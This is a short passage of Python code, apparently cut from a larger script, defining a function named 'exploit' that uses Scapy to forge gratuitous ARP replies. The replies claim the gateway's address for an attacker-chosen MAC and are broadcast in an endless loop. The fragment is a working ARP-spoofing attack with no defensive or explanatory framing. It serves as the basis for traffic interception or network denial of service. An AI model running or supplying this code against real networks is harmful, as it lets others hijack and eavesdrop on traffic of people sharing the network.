...
def exploit(gateway, interface, evilmac):
    ether_frame = Ether(src=args.evilmac, dst=l2broad, type=0x0806)
    arp_frame = ARP(op="is-at", pdst=args.gateway, hwsrc=args.evilmac, hwdst=args.evilmac, psrc=args.gateway)
    grat_frame = ether_frame / arp_frame
    grat_frame.show()
    sendp(grat_frame, iface=args.interface, inter=1, loop=1, verbose=1)
